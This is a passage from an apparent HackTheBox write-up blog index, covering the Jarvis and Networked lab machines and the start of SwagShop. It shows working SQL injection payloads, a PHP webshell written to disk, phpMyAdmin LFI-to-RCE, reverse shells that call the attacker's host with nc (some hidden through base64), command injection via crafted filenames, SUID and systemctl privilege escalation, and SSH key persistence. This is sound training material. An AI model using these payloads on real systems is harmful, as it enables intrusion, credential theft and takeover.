$result=$connection-&amp;gt;query(&quot;select * from room where cod=&quot;.$_GET[&#39;cod&#39;]); $line=mysqli_fetch_array($result); $room=new Room(); $room-&amp;gt;cod=$line[&#39;cod&#39;]; $room-&amp;gt;name=$line[&#39;name&#39;]; connection.php - contains credentials to connect to mysql Load Base64 encoded connection.php # Payload ?cod=-1%20UNION%20SELECT%201,TO_base64(LOAD_FILE(&#39;/var/www/html/connection.php&#39;)),3,4,5,6,7 Decode base64 encoded connection.php ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/loot] └─# echo &quot;PD9waHAKJGNvbm5lY3Rpb249bmV3IG15c3FsaSgnMTI3LjAuMC4xJywnREJhZG1pbicsJ2ltaXNz eW91JywnaG90ZWwnKTsKPz4K&quot; | base64 -d &amp;lt;?php $connection=new mysqli(&#39;127.0.0.1&#39;,&#39;DBadmin&#39;,&#39;imissyou&#39;,&#39;hotel&#39;); ?&amp;gt; DBadmin:imissyou SQLi2RCE (1) - Insert Webshell Insert webshell directly # Payload -1+UNION+SELECT+1,&quot;&amp;lt;?php+system($_GET[&#39;cmd&#39;])?&amp;gt;&quot;,3,4,5,6,7+INTO+OUTFILE+&quot;/var/www/html/shell.php&quot; Demo - Insert webshell &amp;amp; RCE SQLi2RCE (2) - phpmyadmin 4.8.x RCE Search exploits for phpmyadmin 4.8 Exploit Title Path phpMyAdmin 4.8.1 - Remote Code Execution (RCE) php/webapps/50457.py How does phpmyadmin 4.8.x RCE work? An attacker is able to do LFI by bypassing a validation checking function Core::checkPageValidity. The attacker can do LFI2RCE by inserting code into his session and using the LFI vulnerability to invoke the reverse shell. Exploiting phpmyadmin 4.8.x Obtain login credentials from SQLi, DBadmin:imissyou Run exploit ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/exploit] └─# python 50457.py jarvis.htb 80 /phpmyadmin DBadmin imissyou &#39;whoami;id&#39; www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) Obtain www-data shell ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/exploit] └─# python 50457.py jarvis.htb 80 /phpmyadmin DBadmin imissyou &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.24 4444 &amp;gt;/tmp/f&#39; Demo - phpmyadmin 4.8.x RCE SQLi2RCE (3) - phpmyadmin 4.8.x RCE (Manual) Login to phpmyadmin w/ DBadmin:imissyou Obtain sessionID from cookies Proceed to hotel -&amp;gt; SQL -&amp;gt; Insert php code SELECT &quot;&amp;lt;?php exec(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.24 4444 &amp;gt;/tmp/f&#39;)?&amp;gt;&quot; sess_&amp;lt;sessionID&amp;gt; contains our reverse shell Test LFI vulnerability ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/exploit] └─# curl -s -H &quot;Cookie: pma_lang=en; phpMyAdmin=d963f4qde4pmfnmrjdm2dn4e6h47sb4b; pmaUser-1=%7B%22iv%22%3A%22v1BznIkSmLVOsHVNNTFNqQ%3D%3D%22%2C%22mac%22%3A%22c78b88523c9bde8612542e3ce67172a21db0154a%22%2C%22payload%22%3A%22523W1rt6fC2qxsUXfQrJrg%3D%3D%22%7D; pmaAuth-1=%7B%22iv%22%3A%22XQxWd17wpYGgtC47V%2Bmugg%3D%3D%22%2C%22mac%22%3A%22463835e7a5b0b2227709214784a62ae37c7ff083%22%2C%22payload%22%3A%22fnlqZmb0DJ8CIIpS3Rt7cjIpGoZgRfmaHxOWL%5C%2FRpeZg%3D%22%7D; PHPSESSID=0aa5cj91ql3ft2njal6so18ml1&quot; &quot;http://jarvis.htb/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd&quot; ... www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin pepper:x:1000:1000:,,,:/home/pepper:/bin/bash ... Start listener ┌──(root💀kali)-[~/htb/jarvis] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Invoke the reverse shell by using the LFI vulnerability to include sess_&amp;lt;sessionID&amp;gt; ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/exploit] └─# curl -s -H &quot;Cookie: pma_lang=en; phpMyAdmin=d963f4qde4pmfnmrjdm2dn4e6h47sb4b; pmaUser-1=%7B%22iv%22%3A%22v1BznIkSmLVOsHVNNTFNqQ%3D%3D%22%2C%22mac%22%3A%22c78b88523c9bde8612542e3ce67172a21db0154a%22%2C%22payload%22%3A%22523W1rt6fC2qxsUXfQrJrg%3D%3D%22%7D; pmaAuth-1=%7B%22iv%22%3A%22XQxWd17wpYGgtC47V%2Bmugg%3D%3D%22%2C%22mac%22%3A%22463835e7a5b0b2227709214784a62ae37c7ff083%22%2C%22payload%22%3A%22fnlqZmb0DJ8CIIpS3Rt7cjIpGoZgRfmaHxOWL%5C%2FRpeZg%3D%22%7D; PHPSESSID=0aa5cj91ql3ft2njal6so18ml1&quot; &quot;http://jarvis.htb/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_d963f4qde4pmfnmrjdm2dn4e6h47sb4b Demo - php 4.8.x RCE (manual) SQLi2RCE (4) - SQLMap Enumerate databases ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/exploit] └─# sqlmap -r sqli.txt -p cod --dbs --output-dir=$(pwd)/sqlmap --batch Parameter: cod (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: cod=1 AND 3554=3554 Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: cod=1 AND (SELECT 7164 FROM (SELECT(SLEEP(5)))EEJY) Type: UNION query Title: Generic UNION query (NULL) - 7 columns Payload: cod=-3228 UNION ALL SELECT NULL,NULL,CONCAT(0x71626b6a71,0x554b49484f6b664e4e484452436e707246495353424c6444447a665144427579547863494d6f5946,0x7171627a71),NULL,NULL,NULL,NULL-- - available databases [4]: [*] hotel [*] information_schema [*] mysql [*] performance_schema Enumerate tables in hotel database ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/exploit] └─# sqlmap -r sqli.txt -p cod -D hotel --tables --output-dir=$(pwd)/sqlmap --batch Parameter: cod (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: cod=1 AND 3554=3554 Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: cod=1 AND (SELECT 7164 FROM (SELECT(SLEEP(5)))EEJY) Type: UNION query Title: Generic UNION query (NULL) - 7 columns Payload: cod=-3228 UNION ALL SELECT NULL,NULL,CONCAT(0x71626b6a71,0x554b49484f6b664e4e484452436e707246495353424c6444447a665144427579547863494d6f5946,0x7171627a71),NULL,NULL,NULL,NULL-- - Database: hotel [1 table] +------+ | room | +------+ Enumerate columns in room table ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/exploit] └─# sqlmap -r sqli.txt -p cod -D hotel -T room --columns --output-dir=$(pwd)/sqlmap --batch Parameter: cod (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: cod=1 AND 3554=3554 Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: cod=1 AND (SELECT 7164 FROM (SELECT(SLEEP(5)))EEJY) Type: UNION query Title: Generic UNION query (NULL) - 7 columns Payload: cod=-3228 UNION ALL SELECT NULL,NULL,CONCAT(0x71626b6a71,0x554b49484f6b664e4e484452436e707246495353424c6444447a665144427579547863494d6f5946,0x7171627a71),NULL,NULL,NULL,NULL-- - Database: hotel Table: room [7 columns] +---------+--------------+ | Column | Type | +---------+--------------+ | cod | int(11) | | descrip | varchar(400) | | image | varchar(40) | | mini | varchar(400) | | name | varchar(35) | | price | int(11) | | star | varchar(350) | +---------+--------------+ Not useful information SQLMap - Spawn an interactive shell ┌──(root💀kali)-[~/htb/jarvis/10.10.10.143/exploit] └─# sqlmap -r sqli.txt -p cod --os-shell --output-dir=$(pwd)/sqlmap --batch Parameter: cod (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: cod=1 AND 3554=3554 Type: time-based blind Title: MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: cod=1 AND (SELECT 7164 FROM (SELECT(SLEEP(5)))EEJY) Type: UNION query Title: Generic UNION query (NULL) - 7 columns Payload: cod=-3228 UNION ALL SELECT NULL,NULL,CONCAT(0x71626b6a71,0x554b49484f6b664e4e484452436e707246495353424c6444447a665144427579547863494d6f5946,0x7171627a71),NULL,NULL,NULL,NULL-- - which web application language does the web server support? [1] ASP [2] ASPX [3] JSP [4] PHP (default) -&amp;gt; 4 [20:07:10] [WARNING] unable to automatically retrieve the web server document root what do you want to use for writable directory? [1] common location(s) (&#39;/var/www/, /var/www/html, /var/www/htdocs, /usr/local/apache2/htdocs, /usr/local/www/data, /var/apache2/htdocs, /var/www/nginx-default, /srv/www/htdocs, /usr/local/var/www&#39;) (default) [2] custom location(s) [3] custom directory list file [4] brute force search -&amp;gt; 1 os-shell&amp;gt; id;whoami do you want to retrieve the command standard output? [Y/n/a] Y command standard output: --- uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data Demo - SQLMap spawn shell Privilege EscalationPepper - Enumeration Check www-data sudo access www-data@jarvis:/var/www/html$ sudo -l Matching Defaults entries for www-data on jarvis: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User www-data may run the following commands on jarvis: (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py www-data@jarvis:/var/www/html$ simpler.py View simpler.py Cropped to show vulnerable portion Pepper - What is simpler.py doing? simpler.py has 3 functions To display number of attackers, derived from counting the number of files in /home/pepper/web/Logs/ directory. To display IP Address of attackers, derived from reading files in /home/pepper/web/Logs directory. Ping any IP Address Pepper - Exploiting simpler.py Why is simpler.py, specifically exec_ping() function vulnerable? After skimming through the files, exec_ping() function stood out because it is using os_system to execute commands. There is an input sanitization function in place, however it is insufficient. forbidden = [&#39;&amp;amp;&#39;, &#39;;&#39;, &#39;-&#39;, &#39;backticks&#39;, &#39;||&#39;, &#39;|&#39;] How do we exploit simpler.py? We have to first choose the ping function by specifying -p, this will bring us to the exec_ping() function. We are able do command injection w/ $(Payload), since (), $ and / is not in array of forbidden characters. Exploiting simpler.py Create /tmp/pepperbash by copying /bin/bash www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p *********************************************** _ _ ___(_)_ __ ___ _ __ | | ___ _ __ _ __ _ _ / __| | &#39;_ ` _ \\| &#39;_ \\| |/ _ \\ &#39;__| &#39;_ \\| | | | \\__ \\ | | | | | | |_) | | __/ |_ | |_) | |_| | |___/_|_| |_| |_| .__/|_|\\___|_(_)| .__/ \\__, | |_| |_| |___/ @ironhackers.es *********************************************** Enter an IP: $(cp /bin/bash /tmp/pepperbash) Usage: ping [-aAbBdDfhLnOqrRUvV64] [-c count] [-i interval] [-I interface] [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos] [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline] [-W timeout] [hop1 ...] destination Usage: ping -6 [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface] [-l preload] [-m mark] [-M pmtudisc_option] [-N nodeinfo_option] [-p pattern] [-Q tclass] [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline] [-W timeout] destination Check if /tmp/pepperbash is created www-data@jarvis:/var/www/html$ ls -la /tmp | grep pepper -rwxr-xr-x 1 pepper pepper 1099016 Sep 14 17:22 pepperbash Set SUID bit on /tmp/pepperbash www-data@jarvis:/var/www/html$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p *********************************************** _ _ ___(_)_ __ ___ _ __ | | ___ _ __ _ __ _ _ / __| | &#39;_ ` _ \\| &#39;_ \\| |/ _ \\ &#39;__| &#39;_ \\| | | | \\__ \\ | | | | | | |_) | | __/ |_ | |_) | |_| | |___/_|_| |_| |_| .__/|_|\\___|_(_)| .__/ \\__, | |_| |_| |___/ @ironhackers.es *********************************************** Enter an IP: $(chmod 4755 /tmp/pepperbash) Usage: ping [-aAbBdDfhLnOqrRUvV64] [-c count] [-i interval] [-I interface] [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos] [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline] [-W timeout] [hop1 ...] destination Usage: ping -6 [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface] [-l preload] [-m mark] [-M pmtudisc_option] [-N nodeinfo_option] [-p pattern] [-Q tclass] [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline] [-W timeout] destination Execute /tmp/pepperbash to privilege escalate to pepper www-data@jarvis:/var/www/html$ ls -la /tmp/pepperbash -rwsr-xr-x 1 pepper pepper 1099016 Sep 14 17:22 /tmp/pepperbash www-data@jarvis:/var/www/html$ /tmp/pepperbash -p pepperbash-4.4$ id;whoami uid=33(www-data) gid=33(www-data) euid=1000(pepper) groups=33(www-data) pepper pepperbash-4.4$ Demo - simpler.py Privilege Escalation Obtain persistent access w/ SSH Create .ssh pepperbash-4.4$ mkdir .ssh Copy your id_rsa.pub key, place it in target’s .ssh/authorized_keys pepperbash-4.4$ echo &quot;your id_rsa.pub&quot; &amp;gt; .ssh/authorized_keys Change permissions of authorized_keys pepperbash-4.4$ chmod 600 .ssh/authorized_keys SSH into target ┌──(root💀kali)-[~/htb/jarvis] └─# ssh pepper@jarvis.htb Demo - Persistent access w/ SSH Root - Enumeration Found something interesting w/ linpeas.sh systemctl - has a GTFOBins Entry Root - SUID GTFOBINS How do we exploit systemctl If the binary has the SUID bit set, it does not drop the elevated privileges. We are able to create our own malicious service containing a reverse shell, allowing us to privilege escalate to root Exploiting systemctl Start listener ┌──(root💀kali)-[~/htb/jarvis] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Paste this - Create malicious service TF=$(mktemp).service echo &#39;[Service] Type=oneshot ExecStart=/bin/sh -c &quot;nc 10.10.14.24 4444 -e /bin/bash &amp;gt; /tmp/output&quot; [Install] WantedBy=multi-user.target&#39; &amp;gt; $TF /bin/systemctl link $TF /bin/systemctl enable --now $TF root obtained ┌──(root💀kali)-[~/htb/jarvis] └─# nc -nvlp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.143. Ncat: Connection from 10.10.10.143:48096. id;whoami uid=0(root) gid=0(root) groups=0(root) root cd ~ ls clean.sh root.txt sqli_defender.py wc -c root.txt 33 root.txt Demo - GTFOBins systemctl Privilege Escalation " }, { "title": "HackTheBox - Networked", "url": "/posts/Networked/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/file-upload-bypass, exploit/command-injection", "date": "2022-09-13 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, discovering a page where users can only upload images onto the system due to the filters in place, however it can be bypassed by changing the content type (1), filename (2) and adding a GIF header (3), allowing us to upload php-reverse-shell.php, obtaining a low-privilege/www-data shell.For the privilege escalation part, we have to privilege escalate to guly and then to root. After some enumeration, there is a cronjob that is executing a script check_attack.php as guly. The purpose of that script is to check if files in /var/www/html/uploads have a valid IP address in its name, otherwise delete it. The script is vulnerable to command injection due to passing user input directly into exec(), privilege escalating us to user guly.User guly has a sudoers entry, that allows guly to execute change_name.sh as root, the purpose of the script is to add attributes into guly network script. The script is vulnerable because it is writing to a network script file. The vulnerability resides in how attributes in network scripts are handled. If there is a white space in the attribute, system will try to execute the word after the whitespace, allowing us to privilege escalate to root.If you wish to practice boxes similar to this, try VulnHub PwnLab Column Details Box Name Networked IP 10.10.10.146 Points 20 Difficulty Easy Creator guly Release Date 24-Aug-2019 ReconTCP/80 (HTTP) FFUF 301 GET 7l 20w 235c http://10.10.10.146/backup =&amp;gt; http://10.10.10.146/backup/403 GET 8l 22w 210c http://10.10.10.146/cgi-bin/403 GET 8l 22w 215c http://10.10.10.146/cgi-bin/.html200 GET 8l 40w 229c http://10.10.10.146/index.php200 GET 0l 0w 0c http://10.10.10.146/lib.php200 GET 22l 88w 1302c http://10.10.10.146/photos.php200 GET 5l 13w 169c http://10.10.10.146/upload.php301 GET 7l 20w 236c http://10.10.10.146/uploads =&amp;gt; http://10.10.10.146/uploads/ lib.php photos.php upload.php uploads/Initial FootholdTCP/80 (HTTP) - File Upload Bypass After some testing at http://10.10.10.146/upload.php, .php - unable to upload .jpg, .png - successfully uploaded Uploaded files go to uploads/&amp;lt;IP Address&amp;gt;.ext Attempt file upload bypass Upload php-reverse-shell.php, intercept w/ burp Change POST data Content-Disposition: form-data; name=&quot;myFile&quot;; filename=&quot;php-reverse-shell.php.jpg&quot; Content-Type: image/jpg GIF89a; &amp;lt;?php ... Invoke reverse shell ┌──(root💀kali)-[~/htb/networked] └─# curl http://networked.htb/uploads/10_10_14_19.php.jpg If you want to practice this exact upload bypass, try Vulnhub PwnlabPrivilege EscalationGuly - Enumeration Found something interesting in /home/guly bash-4.2$ ls -la /home/guly total 28 drwxr-xr-x. 2 guly guly 159 Jul 9 2019 . drwxr-xr-x. 3 root root 18 Jul 2 2019 .. lrwxrwxrwx. 1 root root 9 Jul 2 2019 .bash_history -&amp;gt; /dev/null -rw-r--r--. 1 guly guly 18 Oct 30 2018 .bash_logout -rw-r--r--. 1 guly guly 193 Oct 30 2018 .bash_profile -rw-r--r--. 1 guly guly 231 Oct 30 2018 .bashrc -rw------- 1 guly guly 639 Jul 9 2019 .viminfo -r--r--r--. 1 root root 782 Oct 30 2018 check_attack.php -rw-r--r-- 1 root root 44 Oct 30 2018 crontab.guly -r--------. 1 guly guly 33 Oct 30 2018 user.txt crontab.guly check_attack.php View check_attack.php Guly - What is check_attack.php doing? What is check_attack.php doing? - TLDR Once a files is uploaded, its name is changed to the IP address of the machine that uploaded the file. Instead of &#39;.&#39;, &#39;_&#39; is used. 10_10_14_14.jpg Basically, it checks if the files in /var/www/html/uploads whether their name is a valid IP address, if it is, do nothing, if isn’t append a warning into a log file and then delete the invalid file. Breaking down what check_attack.php is doing The for loop goes through files residing in /var/www/html/uploads, excluding /var/www/html/index.html The getNameCheck($value) function fix the format of the IP address by replacing &#39;_&#39; w/ &#39;.&#39; and returning the filename 10.10.10.14 and extension .jpg. The check_ip($name, $value) function just checks whether the variable $name (10.10.10.14) is a valid IP address, if not returns ret=false, which means $check[0] is NULL. If $check[0] is NULL, append message to log, remove invalid file and mail. (This part is vulnerable) Guly - Exploiting check_attack.php How do we exploit check_attack.php? (1) We are only interested in exec(...) because it is code execution. exec(&quot;nohup /bin/rm -f $path$value &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&quot;); is vulnerable because $value is passed into exec The variable $value are files residing in /var/www/html/uploads/&amp;lt;file&amp;gt; In order to get to the exec(...) statement, we simply just have to create a file that is != 10_10_10_10.png, not a valid IP Address. How do we exploit check_attack.php? (2) We are able to do command injection by naming the files in uploads directory commands we want to execute # Create our Command Injection Payload touch &quot;/var/www/html/uploads/&amp;lt;Command Injection Payload&amp;gt;&quot; touch &quot;;id;whoami;whoami&quot; # Our Payload is stored in $value variable $value = /var/www/html/uploads/&amp;lt;filename&amp;gt; $value = /var/www/html/uploads/;id;whoami;whoami # What it looks like when command injected exec(&quot;nohup /bin/rm -f /var/www/html/uploads$value &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 exec(&quot;nohup /bin/rm -f /var/www/html/uploads;id;whoami;whoami &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 Create payload Commands we would want to inject will be a reverse shell, most reverse shell requires the character /, however, it is not possible to create a file w/ / in its filename. Bypass/Overcome the restriction We can base64 encode the payload and then decode it pip it in sh Use $(which bash) Our command injection payload is directed into /dev/null, Bypass/Overcome the restriction simply add a random command (;id) so that that command will be passed to /dev/null instead. Exploiting check_attack.php Monitor when check_attack.php is executed w/ pspy64 Create our command injection file (1) bash-4.2$ pwd /var/www/html/uploads bash-4.2$ touch &#39;;nc 10.10.14.19 4444 -e $(which bash);id&#39; bash-4.2$ ls -l total 44 -rw-r--r-- 1 apache apache 12553 Sep 12 19:43 10_10_14_19.jpg -rw-r--r-- 1 apache apache 5502 Sep 12 19:44 10_10_14_19.php.jpg -rw-r--r--. 1 root root 3915 Oct 30 2018 127_0_0_1.png -rw-r--r--. 1 root root 3915 Oct 30 2018 127_0_0_2.png -rw-r--r--. 1 root root 3915 Oct 30 2018 127_0_0_3.png -rw-r--r--. 1 root root 3915 Oct 30 2018 127_0_0_4.png -rw-rw-rw- 1 apache apache 0 Sep 12 23:02 ;nc 10.10.14.19 4444 -e $(which bash);id -r--r--r--. 1 root root 2 Oct 30 2018 index.html Start listener Wait for cronjob to execute guly shell obtained Create our command injection file (2) Encode Payload bash-4.2$ echo &#39;nc 10.10.14.19 4444 -e /bin/bash&#39; | base64 bmMgMTAuMTAuMTQuMTkgNDQ0NCAtZSAvYmluL2Jhc2gK Create file bash-4.2$ bash-4.2$ touch &#39;;echo bmMgMTAuMTAuMTQuMTkgNDQ0NCAtZSAvYmluL2Jhc2gK | base64 -d | sh; id&#39; Start listener Wait for cronjob to execute Demo - check_attack.php Privilege Escalation Root - Enumeration Check guly sudo access [guly@networked tmp]$ sudo -l Matching Defaults entries for guly on networked: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User guly may run the following commands on networked: (root) NOPASSWD: /usr/local/sbin/changename.sh /usr/local/sbin/changename.sh View contents of /usr/local/sbin/changename.sh Root - What is changename.sh doing? What is changename.sh doing - TLDR Basically, changename.sh is a script that allow users to configure parameters on a network interface file called ifcfg-guly by taking their input Breaking down what changename.sh is doing Configure parameters (DEVICE, ONBOOT, NM_CONTROLLED) The for loop will take in users input to configure parameters (NAME, PROXY_METHOD, BROWSER_ONLY, BOOTPROTO) If user input has banned characters, ask for user input again until a valid one is provided Writes user input into ifcfg-guly Starts interface guly0 Root - Exploiting changename.sh After analyzing changename.sh, I could not find any way to do command injection, echo &quot;$var&quot; is usually safe, so command injection is not possible. Instead, I googled, ifcfg privilege escalation, and found something interesting. How do we exploit changename.sh - source The vulnerability resides in how attributes in network scripts are not handled correctly If there are whitespaces in the attribute name, system will try to execute the word after the white space. NAME=testing whoami # whoami will be executed by system as root Spawn root shell a /bin/bash Exploiting changename.sh Execute changename.sh as root [guly@networked tmp]$ sudo /usr/local/sbin/changename.sh Spawn bash, privilege escalating to root [guly@networked tmp]$ sudo /usr/local/sbin/changename.sh interface NAME: a interface PROXY_METHOD: a interface BROWSER_ONLY: a interface BOOTPROTO: a /bin/bash [root@networked network-scripts]# Demo - changename.sh Privilege Escalation AdditionalGuly - What is check_attack.php doing? (In-Depth) Assign some variables # Line 2-7 require &#39;/var/www/html/lib.php&#39;; $path = &#39;/var/www/html/uploads/&#39;; $logpath = &#39;/tmp/attack.log&#39;; $to = &#39;guly&#39;; $msg= &#39;&#39;; $headers = &quot;X-Mailer: check_attack.php\\r\\n&quot;; Create an empty array called files # Line 9 $files = array(); Populate array w/ files in /var/www/html/uploads # Line 10 $files = preg_grep(&#39;/^([^.])/&#39;, scandir($path)); # Testing what is Line 10 doing ┌──(root💀kali)-[~/htb/networked/10.10.10.146/exploit/test] └─# cat test.php &amp;lt;?php $files = preg_grep(&#39;/^([^.])/&#39;, scandir(&quot;/root/htb/networked/10.10.10.146/exploit/test/files&quot;)); foreach($files as $key){ echo $key . &quot;\\n&quot;; } ?&amp;gt; ┌──(root💀kali)-[~/htb/networked/10.10.10.146/exploit/test] └─# ls -la /root/htb/networked/10.10.10.146/exploit/test/files total 8 drwxr-xr-x 2 root root 4096 Sep 13 02:27 . drwxr-xr-x 3 root root 4096 Sep 13 02:26 .. -rw-r--r-- 1 root root 0 Sep 13 02:27 10_10_14_19.png -rw-r--r-- 1 root root 0 Sep 13 02:27 asdf -rw-r--r-- 1 root root 0 Sep 13 02:27 testing_123.png -rw-r--r-- 1 root root 0 Sep 13 02:27 test.png ┌──(root💀kali)-[~/htb/networked/10.10.10.146/exploit/test] └─# php test.php 10_10_14_19.png asdf test.png testing_123.png In this for loop, and if statement # Line 12-16 foreach ($files as $key =&amp;gt; $value) { $msg=&#39;&#39;; if ($value == &#39;index.html&#39;) { continue; } Values in $files array are stored in $key and assign $key to $value If $value == index.html, go right back to the loop instead of proceeding to line 20 onwards. The purpose is to exclude index.html, from code (Line 20 onwards) Pass $value into getNameCheck function # $filename = 10_10_14_19.png # Screenshots are for &quot;safe/not attacks&quot; file (10_10_14_19.png) # If invalid/unsafe file (asdf) , return array(&quot;asdf&quot;,NULL) function getnameCheck($filename) { $pieces = explode(&#39;.&#39;,$filename); $name= array_shift($pieces); $name = str_replace(&#39;_&#39;,&#39;.&#39;,$name); $ext = implode(&#39;.&#39;,$pieces); return array($name,$ext); } Separates the filename into parts by . for e.g. 10_10_14_19.png $pieces[0] = 10_10_14_19.png $pieces[1] = .png Remove first array in $pieces , store it in $name $name = 10_10_14_19 Replaces _ in $name w/ . 10_10_14_19 to 10.10.14.19 Get file extension $ext = png Return array($name,$ext) Store array into list list ($name,$ext) = getnameCheck($value); Pass $name, $value into check_ip function # $name = 10.10.14.19 = $prefix # $value = 10_10_14_19.png = $filename function check_ip($prefix,$filename) { $ret = true; if (!(filter_var($prefix, FILTER_VALIDATE_IP))) { $ret = false; $msg = &quot;4tt4ck on file &quot;.$filename.&quot;: prefix is not a valid ip &quot;; } else { $msg = $filename; } return array($ret,$msg); } Set $ret = true If IP Address is invalid, $ret = false $msg=...not impt... If IP Address is Valid $msg = 10_10_14_19.png $ret = true Return Valid IP: array(1,&quot;10_10_14_19.png&quot;) Invalid IP: array(false,&quot;4tt4ck on file 10_10_14_19.png: prefix is not a valid ip&quot;) If the first value in array $check is false if (!($check[0])) { echo &quot;attack!\\n&quot;;e file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX); exec(&quot;rm -f $logpath&quot;); exec(&quot;nohup /bin/rm -f $path$value &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&quot;); echo &quot;rm -f $path$value\\n&quot;; mail($to, $msg, $msg, $headers, &quot;-F$value&quot;); } Prints &quot;attack&quot; Append $msg into /tmp/attack.log Remove /tmp/attack.log Remove the invalid/unsafe file Prints &quot;rm -f $path$value&quot; What is changename.sh doing? (In-Depth) It is assigning some variables and writing it into /etc/sysconfig/network-scripts/ifcfg-guly cat &amp;gt; /etc/sysconfig/network-scripts/ifcfg-guly &amp;lt;&amp;lt; EoF DEVICE=guly0 ONBOOT=no NM_CONTROLLED=no EoF Create a regex rule regexp=&quot;^[a-zA-Z0-9_\\ /-]+$&quot; # Matches: 1. a-z 2. A-Z 3. 0-9 4. The character &#39;_&#39; 5. The character &#39;&amp;lt;space&amp;gt;&#39; 6. The character &#39;/&#39; 7. The character &#39;-&#39; 8. One or MORE times In every for loop, Create variable $var, assign it to NAME, PROXY_METHOD, BROWSER_ONLY, BOOTPROTO in each loop # Loop1: $var = NAME # Loop2: $var = PROXY_METHOD # Loop3 $var = BROWSER_ONLY # Loop4 $var = BOOTPROTO Print $var in each loop # Example: ┌──(root💀kali)-[~/htb/networked/10.10.10.146/exploit] └─# for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do echo $var; done NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO Accept user input Goes into a while loop If user input does not match regex expression, 1. Print “wrong input…” 2. Print $var 3. Accept user input again until user input matches regex expression. Appends output of $var=&amp;lt;user input&amp;gt; into ifcfg-guly in each loop Bring interface guly0 up. /sbin/ifup guly0 " }, { "title": "HackTheBox - SwagShop", "url": "/posts/SwagShop/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "linux-priv-esc/sudo/gtfo-bin, tcp/80-http/web-app-cms-exploit", "date": "2022-09-12 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a web enumeration, revealing magento v1.9.0 , that is susceptible to RCE, allowing us to obtain a www-data shell.User www-data has a sudoers entry of vi, vi has a GTFOBins entry, allowing us to spawn bash, privilege escalating to root. Column Details Box Name SwagShop IP 10.10.10.140 Points - Difficulty Easy Creator ch4p Release Date 11-May-2019 ReconTCP/80 (HTTP) FFUF 301 GET 9l 28w 310c http://10.10.10.140/app =&amp;gt; http://10.10.10.140/app/ 200 GET 1l 4w 37c http://10.10.10.140/api.php 200 GET 0l 0w 0c http://10.10.10.140/cron.php 301 GET 9l 28w 313c http://10.10.10.140/errors =&amp;gt; http://10.10.10.140/errors/ 200 GET 2l 6w 1150c http://10.10.10.140/favicon.ico 301 GET 9l 28w 315c http://10.10.10.140/includes =&amp;gt; http://10.10.10.140/includes/ 200 GET 3l 6w 44c 